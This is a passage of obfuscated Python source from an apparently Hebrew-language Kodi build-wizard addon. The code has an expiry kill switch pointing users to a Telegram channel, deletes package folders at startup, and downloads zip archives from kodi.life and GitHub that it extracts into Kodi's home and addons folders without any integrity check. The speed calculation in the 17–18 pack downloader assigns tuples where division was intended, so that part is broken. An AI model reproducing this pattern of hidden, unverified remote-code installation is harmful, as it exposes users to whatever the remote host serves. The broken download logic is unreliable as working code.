            if str (TODAY )>=str (O00O000O0000OO0O0 ):#line:4596
             wiz .contact_wiz ('המערכת שלך יותר לא מקבלת עדכונים \nלחידוש יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:4598
             sys .exit ()#line:4599
        if STARTP ()=='ok':#line:4600
            check ()#line:4601
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4602
            xbmc .executebuiltin ("ActivateWindow(home)")#line:4603
            OOOOO00OO000O0OO0 ,OOO000OOOO00OOO0O =wiz .splitNotify (NOTIFICATION )#line:4604
            wiz .setS ('noteid',str (OOOOO00OO000O0OO0 ))#line:4605
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]מוריד עדכון[/COLOR]"%COLOR2 )#line:4606
            checkidupdatetele ('ידני: ')#line:4607
    else :#line:4609
      sys .exit ()#line:4610
def clearPackagesStartup ():#line:4612
    OO000000O0OO00OO0 =os .path .join (ADDONS ,'temp')#line:4613
    OO0OOOOOO00OOOO00 =datetime .utcnow ()-timedelta (minutes =3 )#line:4614
    OO0000O0OOOO0O00O =0 ;O00O0OO00000O00O0 =0 #line:4615
    if os .path .exists (PACKAGES ):#line:4616
        O0000O0O000O0O0O0 =os .listdir (PACKAGES )#line:4617
        O0000O0O000O0O0O0 .sort (key =lambda OO0OO00O00O0O0O00 :os .path .getmtime (os .path .join (PACKAGES ,OO0OO00O00O0O0O00 )))#line:4618
        for O0O0O0000OOO0OOOO in O0000O0O000O0O0O0 :#line:4619
            OO0OOO0O00OOOOO0O =os .path .join (PACKAGES ,O0O0O0000OOO0OOOO )#line:4620
            OOOO000OOO0O00OO0 =datetime .utcfromtimestamp (os .path .getmtime (OO0OOO0O00OOOOO0O ))#line:4621
            if os .path .isfile (OO0OOO0O00OOOOO0O ):#line:4623
                OO0000O0OOOO0O00O +=1 #line:4624
                os .unlink (OO0OOO0O00OOOOO0O )#line:4626
            elif os .path .isdir (OO0OOO0O00OOOOO0O ):#line:4627
                try :#line:4631
                    shutil .rmtree (OO0OOO0O00OOOOO0O )#line:4632
                except :pass #line:4633
    if os .path .exists (OO000000O0OO00OO0 ):#line:4634
        O0000O0O000O0O0O0 =os .listdir (OO000000O0OO00OO0 )#line:4635
        O0000O0O000O0O0O0 .sort (key =lambda O0OO0000OOOO0O0O0 :os .path .getmtime (os .path .join (OO000000O0OO00OO0 ,O0OO0000OOOO0O0O0 )))#line:4636
        for O0O0O0000OOO0OOOO in O0000O0O000O0O0O0 :#line:4637
            OO0OOO0O00OOOOO0O =os .path .join (OO000000O0OO00OO0 ,O0O0O0000OOO0OOOO )#line:4638
            OOOO000OOO0O00OO0 =datetime .utcfromtimestamp (os .path .getmtime (OO0OOO0O00OOOOO0O ))#line:4639
            if os .path .isfile (OO0OOO0O00OOOOO0O ):#line:4641
                OO0000O0OOOO0O00O +=1 #line:4642
                os .unlink (OO0OOO0O00OOOOO0O )#line:4644
            elif os .path .isdir (OO0OOO0O00OOOOO0O ):#line:4645
                try :#line:4649
                    shutil .rmtree (OO0OOO0O00OOOOO0O )#line:4650
                except :pass #line:4651
def auto_build_update (O00OOO00OOOO00O0O ):#line:4653
    xbmc .executebuiltin ("UpdateLocalAddons")#line:4654
    xbmc .executebuiltin ("UpdateAddonRepos")#line:4655
    try :#line:4657
        clearPackagesStartup ()#line:4658
    except :pass #line:4659
    if not xbmc .Player ().isPlaying ():#line:4660
        if BUILDNAME ==" Kodi Premium"or os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:4661
            wiz .wizardUpdate ('startup')#line:4662
            if STARTP ()=='ok':#line:4663
                if not NOTIFY =='true':#line:4665
                    OO000O0OO0OO0O0OO ,O00O00000OOO00OO0 =wiz .splitNotify (NOTIFICATION )#line:4668
                    if not OO000O0OO0OO0O0OO ==False :#line:4669
                        try :#line:4670
                            OO000O0OO0OO0O0OO =int (OO000O0OO0OO0O0OO );O00OOO00OOOO00O0O =int (O00OOO00OOOO00O0O )#line:4671
                            if OO000O0OO0OO0O0OO ==O00OOO00OOOO00O0O :#line:4672
                                if NOTEDISMISS =='false':#line:4673
                                    checkidupdatetele ('אוטומטי: ')#line:4677
                                else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OO000O0OO0OO0O0OO ),5 )#line:4678
                            elif OO000O0OO0OO0O0OO >O00OOO00OOOO00O0O :#line:4679
                                wiz .setS ('noteid',str (OO000O0OO0OO0O0OO ))#line:4683
                                wiz .setS ('notedismiss','false')#line:4684
                                checkidupdatetele ('אוטומטי: ')#line:4685
                        except Exception as OOO0OO00O0OOO0O00 :#line:4688
                            wiz .log ("Error on Notifications Window: %s"%str (OOO0OO00O0OOO0O00 ),5 )#line:4689
def infomovie ():#line:4692
    OO000O00OO0OOOOO0 ='http://kodi.life/movie/update_movie.xml'#line:4693
    OO0OOO000OOO0000O =wiz .workingURL (OO000O00OO0OOOOO0 )#line:4694
    if OO0OOO000OOO0000O ==True :#line:4695
        try :#line:4696
            O0OO00OO000O0O0OO ,O0OO0OOOO0OO0OOO0 =wiz .splitNotify (OO000O00OO0OOOOO0 )#line:4697
            if O0OO00OO000O0O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4698
            if STARTP ()=='ok':#line:4699
                notify .update_movie (O0OO0OOOO0OO0OOO0 ,True )#line:4700
        except Exception as OOOOOOOO0O0OOOOO0 :#line:4701
            wiz .log ("Error on Notifications Window: %s"%str (OOOOOOOO0O0OOOOO0 ),5 )#line:4702
    else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4703
def check_update_movie ():#line:4705
    OOO000OO00O0O000O ='http://kodi.life/movie/update_movie.xml'#line:4707
    O0O00OO0OO0O0O0O0 =wiz .workingURL (OOO000OO00O0O000O )#line:4708
    OOO00000O000OO00O =" Kodi Premium"#line:4709
    OOOO0000000OOOO00 ='http://kodi.life/movie/movie.zip'#line:4710
    O00OO0000000OOO0O =OOO00000O000OO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4711
    if not wiz .workingURL (OOOO0000000OOOO00 )==True :return #line:4712
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4713
    O0000O00O00OO00OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OO0000000OOO0O )#line:4715
    while xbmc .Player ().isPlaying ():#line:4716
        time .sleep (1 )#line:4717
    if 'google'in OOOO0000000OOOO00 :#line:4718
       googledrive_download_BG (OOOO0000000OOOO00 ,O0000O00O00OO00OO ,DP2 ,wiz .checkBuild (OOO00000O000OO00O ,'updatesize'))#line:4719
    else :#line:4721
      downloaderbg .download5 (OOOO0000000OOOO00 ,O0000O00O00OO00OO ,DP2 )#line:4722
    xbmc .sleep (100 )#line:4723
    DP2 .create ('[B][COLOR=green]מעדכן סרטים                         [/COLOR][/B]')#line:4725
    DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:4726
    extract .all2 (O0000O00O00OO00OO ,HOME ,DP2 )#line:4727
    DP2 .close ()#line:4728
    wiz .setS ("notedismiss3","true")#line:4729
    xbmc .sleep (100 )#line:4730
    try :os .remove (O0000O00O00OO00OO )#line:4733
    except :pass #line:4734
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.telemedia?mode=205&url=www)")#line:4735
def auto_movie_update (O0OOOO0OOO0O0O0O0 ):#line:4737
    O00OO0O00O00OO000 ='http://kodi.life/movie/update_movie.xml'#line:4738
    if BUILDNAME ==" Kodi Premium"or os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:4739
        if STARTP ()=='ok':#line:4740
            if not NOTIFY3 =='true':#line:4741
                OO00O0O00000O00OO =wiz .workingURL (O00OO0O00O00OO000 )#line:4742
                if OO00O0O00000O00OO ==True :#line:4743
                    OO00OOOO00OO0000O ,O00O0OO0OO00O0000 =wiz .splitNotify (O00OO0O00O00OO000 )#line:4744
                    if not OO00OOOO00OO0000O ==False :#line:4745
                        try :#line:4746
                            OO00OOOO00OO0000O =int (OO00OOOO00OO0000O );O0OOOO0OOO0O0O0O0 =int (O0OOOO0OOO0O0O0O0 )#line:4747
                            if OO00OOOO00OO0000O ==O0OOOO0OOO0O0O0O0 :#line:4748
                                if NOTEDISMISS3 =='false':#line:4749
                                    check_update_movie ()#line:4750
                            elif OO00OOOO00OO0000O >O0OOOO0OOO0O0O0O0 :#line:4751
                                wiz .setS ('noteid3',str (OO00OOOO00OO0000O ))#line:4753
                                wiz .setS ('notedismiss3','false')#line:4754
                                check_update_movie ()#line:4755
                        except Exception as OOOOO000O0O00OO00 :#line:4756
                            wiz .log ("Error on Notifications Window: %s"%str (OOOOO000O0O00OO00 ),5 )#line:4757
                    else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4758
                else :wiz .log ("[Notifications] URL(%s): %s"%(O00OO0O00O00OO000 ,OO00O0O00000O00OO ),5 )#line:4759
            else :wiz .log ("[Notifications] Turned Off",5 )#line:4760
def auto_movie_firstbuild (O00O0O000O00O0OO0 ):#line:4761
    O0O000OO00O0OO0O0 ='http://kodi.life/movie/update_movie.xml'#line:4762
    if STARTP ()=='ok':#line:4763
        if not NOTIFY3 =='true':#line:4764
            O00O00O000OOO0OOO =wiz .workingURL (O0O000OO00O0OO0O0 )#line:4765
            if O00O00O000OOO0OOO ==True :#line:4766
                O00OO0OO0O0O0O0OO ,O00O0O0O000OO0O00 =wiz .splitNotify (O0O000OO00O0OO0O0 )#line:4767
                if not O00OO0OO0O0O0O0OO ==False :#line:4768
                    try :#line:4769
                        O00OO0OO0O0O0O0OO =int (O00OO0OO0O0O0O0OO );O00O0O000O00O0OO0 =int (O00O0O000O00O0OO0 )#line:4770
                        checkidupdate_movie ()#line:4771
                        wiz .setS ('notedismiss3','true')#line:4772
                        if O00OO0OO0O0O0O0OO ==O00O0O000O00O0OO0 :#line:4773
                            wiz .log ("[Notifications] id[%s] Dismissed"%int (O00OO0OO0O0O0O0OO ),5 )#line:4774
                        elif O00OO0OO0O0O0O0OO >O00O0O000O00O0OO0 :#line:4775
                            wiz .setS ('noteid3',str (O00OO0OO0O0O0O0OO ))#line:4777
                            wiz .setS ('notedismiss3','true')#line:4778
                    except Exception as OO00OOOOOO0OO00O0 :#line:4780
                        wiz .log ("Error on Notifications Window: %s"%str (OO00OOOOOO0OO00O0 ),5 )#line:4781
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4782
            else :wiz .log ("[Notifications] URL(%s): %s"%(O0O000OO00O0OO0O0 ,O00O00O000OOO0OOO ),5 )#line:4783
        else :wiz .log ("[Notifications] Turned Off",5 )#line:4784
def auto_movie_firstbuild3 (O0O0OOOOO0O00OO00 ):#line:4785
    O00OOOO0000O000OO ='http://kodi.life/movie/update_movie.xml'#line:4786
    if STARTP ()=='ok':#line:4787
        if not NOTIFY3 =='true':#line:4788
            O0OO0O00OOO0O0OO0 =wiz .workingURL (O00OOOO0000O000OO )#line:4789
            if O0OO0O00OOO0O0OO0 ==True :#line:4790
                O000000OOO0O000O0 ,O0O0O000O0OO00O00 =wiz .splitNotify (O00OOOO0000O000OO )#line:4791
                if not O000000OOO0O000O0 ==False :#line:4792
                    try :#line:4793
                        O000000OOO0O000O0 =int (O000000OOO0O000O0 );O0O0OOOOO0O00OO00 =int (O0O0OOOOO0O00OO00 )#line:4794
                        if O000000OOO0O000O0 ==O0O0OOOOO0O00OO00 :#line:4795
                            if NOTEDISMISS3 =='false':#line:4796
                                checkidupdate_movie ()#line:4797
                        elif O000000OOO0O000O0 >O0O0OOOOO0O00OO00 :#line:4798
                            wiz .setS ('noteid3',str (O000000OOO0O000O0 ))#line:4800
                            wiz .setS ('notedismiss3','false')#line:4801
                            checkidupdate_movie ()#line:4802
                    except Exception as OO00OOOOOO0O00OOO :#line:4803
                        wiz .log ("Error on Notifications Window: %s"%str (OO00OOOOOO0O00OOO ),5 )#line:4804
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4805
            else :wiz .log ("[Notifications] URL(%s): %s"%(O00OOOO0000O000OO ,O0OO0O00OOO0O0OO0 ),5 )#line:4806
        else :wiz .log ("[Notifications] Turned Off",5 )#line:4807
def iptvkodi17_18 ():#line:4811
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:4814
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:4815
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:4816
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 and KODIV <19 :#line:4820
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:4821
              OO0O0O0O0OOO0OOOO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:4823
              O0OOO0O00O00O0O00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4824
              OO000OOO00000000O =xbmcgui .DialogProgress ()#line:4825
              OO000OOO00000000O .create ("XBMC ISRAEL","Downloading "+'iptv'+'\n'+''+'\n'+'Please Wait')#line:4826
              O00OOOO00OOO000O0 =os .path .join (O0OOO0O00O00O0O00 ,'isr.zip')#line:4827
              O0O000OO00OOO0OOO =Request (OO0O0O0O0OOO0OOOO )#line:4828
              OOO00OO0OO00O000O =urlopen (O0O000OO00OOO0OOO )#line:4829
              O0O000O00000O000O =xbmcgui .DialogProgress ()#line:4831
              O0O000O00000O000O .create ("Downloading","Downloading "+'iptv')#line:4832
              O0O000O00000O000O .update (0 )#line:4833
              O0O00OO000O0O0O0O =open (O00OOOO00OOO000O0 ,'wb')#line:4835
              try :#line:4837
                OO00OOOO00O0O0O0O =OOO00OO0OO00O000O .info ().getheader ('Content-Length').strip ()#line:4838
                O00OOOOOO00O00O0O =True #line:4839
              except AttributeError :#line:4840
                    O00OOOOOO00O00O0O =False #line:4841
              if O00OOOOOO00O00O0O :#line:4843
                    OO00OOOO00O0O0O0O =int (OO00OOOO00O0O0O0O )#line:4844
              OOO0OO0O000OO0O0O =0 #line:4846
              O000O0O00000O0O00 =time .time ()#line:4847
              while True :#line:4848
                    O0O0OOO0O0OOOO0OO =OOO00OO0OO00O000O .read (8192 )#line:4849
                    if not O0O0OOO0O0OOOO0OO :#line:4850
                        sys .stdout .write ('\n')#line:4851
                        break #line:4852
                    OOO0OO0O000OO0O0O +=len (O0O0OOO0O0OOOO0OO )#line:4854
                    O0O00OO000O0O0O0O .write (O0O0OOO0O0OOOO0OO )#line:4855
                    if not O00OOOOOO00O00O0O :#line:4857
                        OO00OOOO00O0O0O0O =OOO0OO0O000OO0O0O #line:4858
                    if O0O000O00000O000O .iscanceled ():#line:4859
                       O0O000O00000O000O .close ()#line:4860
                       try :#line:4861
                        os .remove (O00OOOO00OOO000O0 )#line:4862
                       except :#line:4863
                        pass #line:4864
                       break #line:4865
                    OO000OO000OO0OOOO =float (OOO0OO0O000OO0O0O )/OO00OOOO00O0O0O0O #line:4866
                    OO000OO000OO0OOOO =round (OO000OO000OO0OOOO *100 ,2 )#line:4867
                    OOOO00O0O0O0000OO =old_div (OOO0OO0O000OO0O0O ,(1024 *1024 ))#line:4868
                    OOO00O0O0O0O0OOOO =old_div (OO00OOOO00O0O0O0O ,(1024 *1024 ))#line:4869
                    OO0OO00O0OOOO000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO00O0O0O0000OO ,'teal',OOO00O0O0O0O0OOOO )#line:4870
                    if (time .time ()-O000O0O00000O0O00 )>0 :#line:4871
                      O00OO0OOOO0000O00 =old_div (OOO0OO0O000OO0O0O ,(time .time ()-O000O0O00000O0O00 ))#line:4872
                      O00OO0OOOO0000O00 =old_div (O00OO0OOOO0000O00 ,1024 )#line:4873
                    else :#line:4874
                     O00OO0OOOO0000O00 =0 #line:4875
                    O0OOOOOOOOOOOOOOO ='KB'#line:4876
                    if O00OO0OOOO0000O00 >=1024 :#line:4877
                       O00OO0OOOO0000O00 =old_div (O00OO0OOOO0000O00 ,1024 )#line:4878
                       O0OOOOOOOOOOOOOOO ='MB'#line:4879
                    if O00OO0OOOO0000O00 >0 and not OO000OO000OO0OOOO ==100 :#line:4880
                        O0OO00OO0OO00O0OO =old_div ((OO00OOOO00O0O0O0O -OOO0OO0O000OO0O0O ),O00OO0OOOO0000O00 )#line:4881
                    else :#line:4882
                        O0OO00OO0OO00O0OO =0 #line:4883
                    O0OO0O000OOO000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OO0OOOO0000O00 ,O0OOOOOOOOOOOOOOO )#line:4884
                    O0O000O00000O000O .update (int (OO000OO000OO0OOOO ),"Downloading "+'iptv'+'\n'+OO0OO00O0OOOO000O +'\n'+O0OO0O000OOO000O0 )#line:4886
              OO00OO0OO00OOO0O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4889
              O0O00OO000O0O0O0O .close ()#line:4892
              extract .all (O00OOOO00OOO000O0 ,OO00OO0OO00OOO0O0 ,O0O000O00000O000O )#line:4893
              wiz .kodi17Fix ()#line:4895
              try :#line:4897
                os .remove (O00OOOO00OOO000O0 )#line:4898
              except :#line:4900
                pass #line:4901
              O0O000O00000O000O .close ()#line:4902
              xbmc .sleep (5000 )#line:4904
              OOO0OOO0OOO0000OO ='התקנת לקוח טלוויזיה חיה'#line:4906
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOO0OOO0000OO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:4907
              resetkodi ()#line:4908
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:4909
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 and KODIV <19 :#line:4910
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:4911
              OO0O0O0O0OOO0OOOO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:4912
              O0OOO0O00O00O0O00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4913
              OO000OOO00000000O =xbmcgui .DialogProgress ()#line:4914
              OO000OOO00000000O .create ("XBMC ISRAEL","Downloading "+'iptv'+'\n'+''+'\n'+'Please Wait')#line:4915
              O00OOOO00OOO000O0 =os .path .join (O0OOO0O00O00O0O00 ,'isr.zip')#line:4916
              O0O000OO00OOO0OOO =Request (OO0O0O0O0OOO0OOOO )#line:4917
              OOO00OO0OO00O000O =urlopen (O0O000OO00OOO0OOO )#line:4918
              O0O000O00000O000O =xbmcgui .DialogProgress ()#line:4920
              O0O000O00000O000O .create ("Downloading","Downloading "+'iptv')#line:4921
              O0O000O00000O000O .update (0 )#line:4922
              O0O00OO000O0O0O0O =open (O00OOOO00OOO000O0 ,'wb')#line:4924
              try :#line:4926
                OO00OOOO00O0O0O0O =OOO00OO0OO00O000O .info ().getheader ('Content-Length').strip ()#line:4927
                O00OOOOOO00O00O0O =True #line:4928
              except AttributeError :#line:4929
                    O00OOOOOO00O00O0O =False #line:4930
              if O00OOOOOO00O00O0O :#line:4932
                    OO00OOOO00O0O0O0O =int (OO00OOOO00O0O0O0O )#line:4933
              OOO0OO0O000OO0O0O =0 #line:4935
              O000O0O00000O0O00 =time .time ()#line:4936
              while True :#line:4937
                    O0O0OOO0O0OOOO0OO =OOO00OO0OO00O000O .read (8192 )#line:4938
                    if not O0O0OOO0O0OOOO0OO :#line:4939
                        sys .stdout .write ('\n')#line:4940
                        break #line:4941
                    OOO0OO0O000OO0O0O +=len (O0O0OOO0O0OOOO0OO )#line:4943
                    O0O00OO000O0O0O0O .write (O0O0OOO0O0OOOO0OO )#line:4944
                    if not O00OOOOOO00O00O0O :#line:4946
                        OO00OOOO00O0O0O0O =OOO0OO0O000OO0O0O #line:4947
                    if O0O000O00000O000O .iscanceled ():#line:4948
                       O0O000O00000O000O .close ()#line:4949
                       try :#line:4950
                        os .remove (O00OOOO00OOO000O0 )#line:4951
                       except :#line:4952
                        pass #line:4953
                       break #line:4954
                    OO000OO000OO0OOOO =float (OOO0OO0O000OO0O0O )/OO00OOOO00O0O0O0O #line:4955
                    OO000OO000OO0OOOO =round (OO000OO000OO0OOOO *100 ,2 )#line:4956
                    OOOO00O0O0O0000OO =old_div (OOO0OO0O000OO0O0O ,(1024 *1024 ))#line:4957
                    OOO00O0O0O0O0OOOO =old_div (OO00OOOO00O0O0O0O ,(1024 *1024 ))#line:4958
                    OO0OO00O0OOOO000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO00O0O0O0000OO ,'teal',OOO00O0O0O0O0OOOO )#line:4959
                    if (time .time ()-O000O0O00000O0O00 )>0 :#line:4960
                      O00OO0OOOO0000O00 =old_div (OOO0OO0O000OO0O0O ,(time .time ()-O000O0O00000O0O00 ))#line:4961
                      O00OO0OOOO0000O00 =old_div (O00OO0OOOO0000O00 ,1024 )#line:4962
                    else :#line:4963
                     O00OO0OOOO0000O00 =0 #line:4964
                    O0OOOOOOOOOOOOOOO ='KB'#line:4965
                    if O00OO0OOOO0000O00 >=1024 :#line:4966
                       O00OO0OOOO0000O00 =old_div (O00OO0OOOO0000O00 ,1024 )#line:4967
                       O0OOOOOOOOOOOOOOO ='MB'#line:4968
                    if O00OO0OOOO0000O00 >0 and not OO000OO000OO0OOOO ==100 :#line:4969
                        O0OO00OO0OO00O0OO =old_div ((OO00OOOO00O0O0O0O -OOO0OO0O000OO0O0O ),O00OO0OOOO0000O00 )#line:4970
                    else :#line:4971
                        O0OO00OO0OO00O0OO =0 #line:4972
                    O0OO0O000OOO000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OO0OOOO0000O00 ,O0OOOOOOOOOOOOOOO )#line:4973
                    O0O000O00000O000O .update (int (OO000OO000OO0OOOO ),"Downloading "+'iptv'+'\n'+OO0OO00O0OOOO000O +'\n'+O0OO0O000OOO000O0 )#line:4975
              OO00OO0OO00OOO0O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4978
              O0O00OO000O0O0O0O .close ()#line:4981
              extract .all (O00OOOO00OOO000O0 ,OO00OO0OO00OOO0O0 ,O0O000O00000O000O )#line:4982
              wiz .kodi17Fix ()#line:4983
              try :#line:4985
                os .remove (O00OOOO00OOO000O0 )#line:4986
              except :#line:4988
                pass #line:4989
              O0O000O00000O000O .close ()#line:4990
              xbmc .sleep (5000 )#line:4992
              OOO0OOO0OOO0000OO ='התקנת לקוח טלוויזיה חיה'#line:4994
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOO0OOO0000OO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:4995
              resetkodi ()#line:4996
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:4998
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:4999
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5000
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5001
def kodi17_18pack ():#line:5005
    OO00000OOO000OOOO ='https://github.com/vip200/Build/blob/master/17pack.zip?raw=true'#line:5006
    OO000OO000O000OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5007
    O0OO000OO000OOOO0 =os .path .join (PACKAGES ,'isr.zip')#line:5010
    O0O00O0OOOO0OO0OO =Request (OO00000OOO000OOOO )#line:5011
    OOO00O000OOO0O00O =urlopen (O0O00O0OOOO0OO0OO )#line:5012
    O0OO0000OO0OO0O00 =xbmcgui .DialogProgress ()#line:5014
    O0OO0000OO0OO0O00 .create ("[B][COLOR=yellow]מוריד חבילת קבצים[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:5015
    O0OO0000OO0OO0O00 .update (0 )#line:5016
    O00O0O00OOOO0OOOO =open (O0OO000OO000OOOO0 ,'wb')#line:5018
    try :#line:5020
      O0O00000O000O000O =OOO00O000OOO0O00O .info ().getheader ('Content-Length').strip ()#line:5021
      O00O0000O0OO0O0OO =True #line:5022
    except AttributeError :#line:5023
          O00O0000O0OO0O0OO =False #line:5024
    if O00O0000O0OO0O0OO :#line:5026
          O0O00000O000O000O =int (O0O00000O000O000O )#line:5027
    OOO00OOOO0000OOOO =0 #line:5029
    OOOO00OOOO0OO0000 =time .time ()#line:5030
    while True :#line:5031
          O0O000O0O000O000O =OOO00O000OOO0O00O .read (8192 )#line:5032
          if not O0O000O0O000O000O :#line:5033
              sys .stdout .write ('\n')#line:5034
              break #line:5035
          OOO00OOOO0000OOOO +=len (O0O000O0O000O000O )#line:5037
          O00O0O00OOOO0OOOO .write (O0O000O0O000O000O )#line:5038
          if not O00O0000O0OO0O0OO :#line:5040
              O0O00000O000O000O =OOO00OOOO0000OOOO #line:5041
          if O0OO0000OO0OO0O00 .iscanceled ():#line:5042
             O0OO0000OO0OO0O00 .close ()#line:5043
             try :#line:5044
              os .remove (O0OO000OO000OOOO0 )#line:5045
             except :#line:5046
              pass #line:5047
             break #line:5048
          OO000OOOO0O000OOO =float (OOO00OOOO0000OOOO )/O0O00000O000O000O #line:5049
          OO000OOOO0O000OOO =round (OO000OOOO0O000OOO *100 ,2 )#line:5050
          O00OOO00OOO0O0OOO =OOO00OOOO0000OOOO /(1024 *1024 )#line:5051
          OO000OO0OO0O0O0O0 =O0O00000O000O000O /(1024 *1024 )#line:5052
          OO0OO000O00OO0O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OOO00OOO0O0OOO ,'teal',OO000OO0OO0O0O0O0 )#line:5053
          if (time .time ()-OOOO00OOOO0OO0000 )>0 :#line:5055
            OOO0000O0000000OO =OOO00OOOO0000OOOO ,(time .time ()-OOOO00OOOO0OO0000 )#line:5056
            OOO0000O0000000OO =OOO0000O0000000OO ,1024 #line:5057
          else :#line:5058
           OOO0000O0000000OO =0 #line:5059
          O0O0000OOO0O000O0 ='KB'#line:5060
          if OOO0000O0000000OO >=1024 :#line:5061
             OOO0000O0000000OO =OOO0000O0000000OO ,1024 #line:5062
             O0O0000OOO0O000O0 ='MB'#line:5063
          if OOO0000O0000000OO >0 and not OO000OOOO0O000OOO ==100 :#line:5064
              OO000000OO00OOO0O =(O0O00000O000O000O -OOO00OOOO0000OOOO ),OOO0000O0000000OO #line:5065
          else :#line:5066
              OO000000OO00OOO0O =0 #line:5067
          O00O0OO000000000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',0 ,O0O0000OOO0O000O0 )#line:5068
          O0OO0000OO0OO0O00 .update (int (OO000OOOO0O000OOO ),"[B][COLOR=green]מוריד חבילת קבצים לקודי 17 - 18 [/COLOR][/B]",OO0OO000O00OO0O00 ,O00O0OO000000000O )#line:5070
    OO00000OO00OO0OOO =xbmc .translatePath (os .path .join ('special://home'))#line:5073
    O00O0O00OOOO0OOOO .close ()#line:5076
    extract .all (O0OO000OO000OOOO0 ,OO00000OO00OO0OOO ,O0OO0000OO0OO0O00 )#line:5077
    try :#line:5081
      os .remove (O0OO000OO000OOOO0 )#line:5082
    except :#line:5083
      pass #line:5084
def linux_pack ():#line:5085
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מוריד קבצים למערכת הפעלה לינוקס[/COLOR]'%COLOR2 )#line:5087
    O0O00O0OOO0OO0O00 =" Kodi Premium"#line:5090
    OOO000000O0OOO000 ='http://kodi.life/linux/pack.zip'#line:5091
    O0OO0OO0OOO00O00O =O0O00O0OOO0OO0O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5092
    if not wiz .workingURL (OOO000000O0OOO000 )==True :return #line:5093
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5094
    try :#line:5095
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O00O0OOO0OO0O00 ),'','אנא המתן')#line:5096
    except :#line:5097
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O00O0OOO0OO0O00 ))#line:5098
    OO00O000O00OO0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO0OO0OOO00O00O )#line:5099
    try :os .remove (OO00O000O00OO0O00 )#line:5100
    except :pass #line:5101
    if 'google'in OOO000000O0OOO000 :#line:5103
       googledrive_download (OOO000000O0OOO000 ,OO00O000O00OO0O00 ,DP ,wiz .checkBuild (O0O00O0OOO0OO0O00 ,'updatesize'))#line:5104
    else :#line:5106
